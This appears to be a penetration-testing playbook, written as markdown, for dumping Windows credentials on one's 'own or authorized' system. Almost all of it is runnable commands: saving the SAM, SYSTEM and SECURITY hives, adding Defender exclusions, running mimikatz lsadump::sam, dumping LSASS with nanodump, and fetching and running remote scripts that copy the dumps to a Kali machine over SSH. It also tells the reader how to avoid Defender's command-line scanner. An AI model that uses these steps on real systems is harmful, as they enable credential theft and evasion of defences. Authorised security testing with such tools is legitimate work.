# Credential Dump on Own/Authorized System
## Test registry before and after first Microsoft Account password authentication

> **⚠️ AUTHORIZATION REQUIRED**
> This workflow involves credential dumping techniques including LSASS memory extraction and SAM registry hive access. These techniques must only be performed on systems you own or have explicit written authorization to test. Performing these actions on any system without authorization is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws in other jurisdictions. This document is provided for authorized security research and educational purposes only.

---

### Step 1: Change to the mounted drive
```powershell
cd <your_drive>:\
```

---

### Step 2: Dump Registry (Reg.exe)
```powershell
del *.save
dir *.save
reg.exe save hklm\sam sam.save
reg.exe save hklm\system system.save
reg.exe save hklm\security security.save
dir *.save
```

---

### Step 3: Download Add-TrustedFileExclusion.ps1
```powershell
del Add-TrustedFileExclusion.ps1
dir Add-TrustedFileExclusion.ps1
Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/passwordless-credential-audit/main/Add-TrustedFileExclusion.ps1" -OutFile "Add-TrustedFileExclusion.ps1" -UseBasicParsing
dir Add-TrustedFileExclusion.ps1
```

---

### Step 4: Dump Registry (mimikatz)

> **Note:** mimikatz commands must be entered interactively. Passing them as command-line arguments triggers Defender's CmdLine scanner and results in immediate remediation regardless of file exclusions.

```powershell
del mimikatz.exe
dir mimikatz.exe
.\Add-TrustedFileExclusion.ps1 -FilePath ".\mimikatz.exe" -URL "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
dir mimikatz.exe
.\mimikatz.exe
```

```
privilege::debug
```

```
log mimikatz.log
```

```
token::elevate
```

```
lsadump::sam
```

```
exit
```

```powershell
dir mimikatz.log
```

---

### Step 5: Dump LSASS (nanodump)
```powershell
del nanodump.x64.exe
dir nanodump.x64.exe
.\Add-TrustedFileExclusion.ps1 -FilePath ".\nanodump.x64.exe" -URL "https://github.com/fortra/nanodump/blob/main/dist/nanodump.x64.exe"
dir nanodump.x64.exe
del lsass_nanodump.bat
dir lsass_nanodump.bat
Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/passwordless-credential-audit/main/lsass_nanodump.bat" -OutFile "lsass_nanodump.bat" -UseBasicParsing
dir lsass_nanodump.bat
.\lsass_nanodump.bat
dir lsass_nanodump.dmp
```

---

### Step 6: Enable SSH
```powershell
Set-Service -Name sshd -StartupType Automatic
Start-Service sshd
Set-NetFirewallRule -DisplayName "OpenSSH SSH Server (sshd)" -Profile Private,Public -Enabled True
```

> **Before running dump-your-pc.ps1:** Start the Kali SSH server so the script can transfer files automatically.
> ```bash
> sudo systemctl start ssh
> ```

---

### Step 7: Run dump-your-pc.ps1 and then kali-dump.sh
```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/pentest-cheatsheets/main/hash-verification/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
.\dump-your-pc.ps1
```

> `dump-your-pc.ps1` transfers `your_config.txt` and `kali-dump.sh` directly to Kali. On Kali, run:

```bash
ssh-keygen -f '~/.ssh/known_hosts' -R '<WINDOWS_IP>'
chmod +x kali-dump.sh
./kali-dump.sh
```
```
